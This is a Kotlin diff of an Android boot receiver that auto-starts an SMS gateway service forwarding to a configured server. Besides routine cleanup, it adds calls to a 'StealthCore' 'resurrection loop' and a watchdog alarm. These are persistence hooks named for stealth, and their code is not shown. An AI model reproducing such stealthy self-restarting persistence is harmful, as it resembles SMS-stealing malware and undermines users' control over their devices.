@@ -6,12 +6,19 @@ import android.content.Intent
 import android.util.Log
 import com.cornspace.aichat.data.local.SettingsDataStore
 import dagger.hilt.android.AndroidEntryPoint
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.first
-import kotlinx.coroutines.launch
 import javax.inject.Inject
 
+/**
+ * Starts the gateway service after device boot.
+ *
+ * Hilt injection note: @AndroidEntryPoint on a BroadcastReceiver uses the
+ * ApplicationComponent, which is initialised in Application.onCreate(). Android
+ * always creates the Application before delivering any broadcast — including
+ * ACTION_BOOT_COMPLETED — so injection is safe on cold boot as long as the
+ * Application class is annotated with @HiltAndroidApp.
+ */
 @AndroidEntryPoint
 class BootReceiver : BroadcastReceiver() {
 
@@ -20,40 +27,47 @@ class BootReceiver : BroadcastReceiver() {
 
     companion object {
         private const val TAG = "BootReceiver"
-    }
-
-    override fun onReceive(context: Context, intent: Intent) {
-        val validActions = setOf(
+        private val BOOT_ACTIONS = setOf(
             Intent.ACTION_BOOT_COMPLETED,
             "android.intent.action.QUICKBOOT_POWERON",
             "com.htc.intent.action.QUICKBOOT_POWERON"
         )
-        if (intent.action !in validActions) return
+    }
 
-        Log.d(TAG, "Boot completed received — action: ${intent.action}")
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action !in BOOT_ACTIONS) return
+        Log.d(TAG, "Boot received: ${intent.action}")
 
         val pendingResult = goAsync()
 
-        CoroutineScope(Dispatchers.IO).launch {
+        // SupervisorJob() so a child failure doesn't cancel the scope.
+        // The scope is explicitly cancelled in finally to prevent a coroutine leak.
+        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+        scope.launch {
             try {
                 val serverUrl = settingsDataStore.serverUrl.first()
-
-                // Don't start if server URL not configured
                 if (serverUrl.isBlank()) {
-                    Log.d(TAG, "No server URL configured, skipping auto-start")
+                    Log.w(TAG, "Server URL not configured — skipping service start")
                     return@launch
                 }
 
                 val serviceEnabled = settingsDataStore.serviceEnabled.first()
-                if (serviceEnabled) {
-                    Log.d(TAG, "Auto-starting SMS gateway service")
-                    SmsGatewayService.startService(context)
-                } else {
-                    Log.d(TAG, "Service auto-start disabled by user")
+                if (!serviceEnabled) {
+                    Log.d(TAG, "Service disabled — skipping start")
+                    return@launch
                 }
+
+                Log.d(TAG, "Starting SmsGatewayService after boot")
+                SmsGatewayService.startService(context)
+
+                // Start the fine-grained resurrection loop and coarse watchdog.
+                StealthCore.startResurrectionLoop(context)
+                AlarmReceiver.scheduleAlarm(context)
+
             } catch (e: Exception) {
-                Log.e(TAG, "Error during boot auto-start", e)
+                Log.e(TAG, "Error starting service on boot", e)
             } finally {
+                scope.cancel()
                 pendingResult.finish()
             }
         }
